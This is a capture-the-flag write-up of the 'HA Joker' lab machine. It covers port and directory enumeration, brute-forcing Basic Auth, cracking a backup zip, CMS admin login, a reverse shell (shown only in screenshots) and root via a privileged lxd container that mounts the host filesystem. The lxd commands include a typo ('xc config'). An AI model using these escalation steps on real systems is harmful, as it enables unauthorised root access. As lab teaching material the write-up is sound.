---
title: HA Joker CTF
description: joker
---


Difficulty: Medium

![image.png](../../../assets/joker/image.png)

## Information Gathering Phase

### Nmap

```python
┌──(khem㉿kali)-[~]
└─$ nmap -sCV -A -vv 10.10.11.96                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 12:30 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:30
Completed NSE at 12:30, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:30
Completed NSE at 12:30, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:30
Completed NSE at 12:30, 0.00s elapsed
Initiating Ping Scan at 12:30
Scanning 10.10.11.96 [2 ports]
Completed Ping Scan at 12:30, 0.33s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:30
Completed Parallel DNS resolution of 1 host. at 12:30, 0.20s elapsed
Initiating Connect Scan at 12:30
Scanning 10.10.11.96 [1000 ports]
Discovered open port 22/tcp on 10.10.11.96
Discovered open port 80/tcp on 10.10.11.96
Discovered open port 8080/tcp on 10.10.11.96
Increasing send delay for 10.10.11.96 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.11.96 from 5 to 10 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.11.96 from 10 to 20 due to 11 out of 18 dropped probes since last increase.
Increasing send delay for 10.10.11.96 from 20 to 40 due to 11 out of 16 dropped probes since last increase.
Increasing send delay for 10.10.11.96 from 40 to 80 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.11.96 from 80 to 160 due to max_successful_tryno increase to 7
Completed Connect Scan at 12:31, 85.48s elapsed (1000 total ports)
Initiating Service scan at 12:31
Scanning 3 services on 10.10.11.96
Completed Service scan at 12:31, 6.80s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.11.96.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 8.91s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 1.76s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 0.00s elapsed
Nmap scan report for 10.10.11.96
Host is up, received syn-ack (0.31s latency).
Scanned at 2024-12-02 12:30:11 EST for 103s
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL89x6yGLD8uQ9HgFK1nvBGpjT6KJXIwZZ56/pjgdRK/dOSpvl0ckMaa68V9bLHvn0Oerh2oa4Q5yCnwddrQnm7JHJ4gNAM+lg+ML7+cIULAHqXFKPpPAjvEWJ7T6+NRrLc9q8EixBsbEPuNer4tGGyUJXg6GpjWL5jZ79TwZ80ANcYPVGPZbrcCfx5yR/1KBTcpEdUsounHjpnpDS/i+2rJ3ua8IPUrqcY3GzlDcvF7d/+oO9GxQ0wjpy1po6lDJ/LytU6IPFZ1Gn/xpRsOxw0N35S7fDuhn69XlXj8xiDDbTlOhD4sNxckX0veXKpo6ynQh5t3yM5CxAQdqRKgFF
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOzF9YUxQxzgUVsmwq9ZtROK9XiPOB0quHBIwbMQPScfnLbF3/Fws+Ffm/l0NV7aIua0W7FLGP3U4cxZEDFIzfQ=
|   256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPLWfYB8/GSsvhS7b9c6hpXJCO6p1RvLsv4RJMvN4B3r
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA: Joker
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
8080/tcp open  http    syn-ack Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-title: 401 Unauthorized
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.89 seconds

```

Q. What version of Apache is it?

Ans: 2.4.29

Q. What port on this machine not need to be authenticated by user and password?

Ans: 80

**Discovery of Hidden Directory**

![image.png](../../../assets/joker/image%201.png)

Q. There is a file on this port that seems to be secret, what is it?

Ans: secret.txt

![image.png](../../../assets/joker/image%202.png)

Q. There is another file which reveals information of the backend, what is it?

Ans: phpinfo.php

![image.png](../../../assets/joker/image%203.png)

Q. When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?

Ans: joker

Q. What port on this machine need to be authenticated by Basic Authentication Mechanism?

Ans: 8080

Q. At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?

![image.png](../../../assets/joker/image%204.png)

![image.png](../../../assets/joker/image%205.png)

Q. Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?

Ans: /administrator/

![image.png](../../../assets/joker/image%206.png)

Q. We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?

Ans: backup.zip

```python
┌──(khem㉿kali)-[~]
└─$ gobuster dir -U joker -P hannah -u http://10.10.29.251:8080/ -w common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.29.251:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Auth User:               joker
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/LICENSE              (Status: 200) [Size: 18092]
/README               (Status: 200) [Size: 4494]
/administrator        (Status: 301) [Size: 327] [--> http://10.10.29.251:8080/administrator/]
/backup.zip           (Status: 200) [Size: 317]
/bin                  (Status: 301) [Size: 317] [--> http://10.10.29.251:8080/bin/]
/cache                (Status: 301) [Size: 319] [--> http://10.10.29.251:8080/cache/]
Progress: 1125 / 4729 (23.79%)[ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
/components           (Status: 301) [Size: 324] [--> http://10.10.29.251:8080/components/]
/images               (Status: 301) [Size: 320] [--> http://10.10.29.251:8080/images/]
/includes             (Status: 301) [Size: 322] [--> http://10.10.29.251:8080/includes/]
/index.php            (Status: 200) [Size: 10947]
/language             (Status: 301) [Size: 322] [--> http://10.10.29.251:8080/language/]
/layouts              (Status: 301) [Size: 321] [--> http://10.10.29.251:8080/layouts/]
/libraries            (Status: 301) [Size: 323] [--> http://10.10.29.251:8080/libraries/]
/media                (Status: 301) [Size: 319] [--> http://10.10.29.251:8080/media/]
/modules              (Status: 301) [Size: 321] [--> http://10.10.29.251:8080/modules/]
/plugins              (Status: 301) [Size: 321] [--> http://10.10.29.251:8080/plugins/]
/robots               (Status: 200) [Size: 836]
/robots.txt           (Status: 200) [Size: 836]
/server-status        (Status: 403) [Size: 279]
/templates            (Status: 301) [Size: 323] [--> http://10.10.29.251:8080/templates/]
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.29.251:8080/tmp/]
/web.config           (Status: 200) [Size: 1690]
Progress: 4728 / 4729 (99.98%)
===============================================================
Finished
===============================================================
```

robots.txt

![image.png](../../../assets/joker/image%207.png)

Q. We have the backup file and now we should look for some information, for example database, configuration files, etc ... But the backup file seems to be encrypted. What is the password?

Ans: hannah

![image.png](../../../assets/joker/image%208.png)

```python
┌──(khem㉿kali)-[~]
└─$ zip2john backup.zip > backup.hash
```

![image.png](../../../assets/joker/image%209.png)

Q. Remember that... We need access to the administration of the site... Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?

Ans: admin

![image.png](../../../assets/joker/image%2010.png)

Q. Super Duper User! What is the password?

Ans: abcd1234

![image.png](../../../assets/joker/image%2011.png)

logged in as admin 

![image.png](../../../assets/joker/image%2012.png)

Q. At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?

![image.png](../../../assets/joker/image%2013.png)

![image.png](../../../assets/joker/image%2014.png)

![image.png](../../../assets/joker/image%2015.png)

Q. At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?

Ans: www-data

Q. This user belongs to a group that differs on your own group, What is this group?

Ans: lxd

![image.png](../../../assets/joker/image%2016.png)

Q. Spawn a tty shell.

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Privilege Escalation

Now we have low level shell(www-data) and we can see that it is a member of lxd group. We are given with all the directions what to do next.

lxd privilege-escalation: [https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)

for that we need to learn it, on the above link all the solution are there.

Now start with download

[https://github.com/saghul/lxd-alpine-builder?source=post_page-----8988e4e3d5b--------------------------------](https://github.com/saghul/lxd-alpine-builder?source=post_page-----8988e4e3d5b--------------------------------)

```python
git clone https://github.com/saghul/lxd-alpine-builder.git
```

now cd to lxd container

```python
sudo ./build-alpine -a i686
```

once it is done there will be  .tar.gz  file that needs to be upload to target machine. 

```python
python3 -m http.server <port No.>
```

using wget/curl upload the file to target machine

![image.png](../../../assets/joker/image%2017.png)

now we can upload image to lxd

```python
lxc image import alpine-v3.12-i686-20201010_1904.tar.gz.1 --alias alpine
```

![image.png](../../../assets/joker/image%2018.png)

we can see our image using “lxc image list” command

![image.png](../../../assets/joker/image%2019.png)

We now need to create a machine from the image, this can be done by running the following command:

```python
lxc init alpine privesc -c security.privileged=true
```

![image.png](../../../assets/joker/image%2020.png)

To gain root access, mount the entire host system into /mnt/root using this command.

```python
xc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

![image.png](../../../assets/joker/image%2021.png)

now we need to start the machine. and lxc list to ensure that the machine is running.

![image.png](../../../assets/joker/image%2022.png)

now to exploit machine run following command:

```python
lxc exec privesc /bin/sh
```

![image.png](../../../assets/joker/image%2023.png)

navigate to the root directory and we get the final.txt

![image.png](../../../assets/joker/image%2024.png)

## Final Thought

Enjoyed the machine. This machine was great, providing the hints which helps the us to directly aim the task. If there is no hints it would be hard to find exploits. So I would like to recommend this room to beginner who have done some room. The new thing here is lxd which makes the room challenges unique.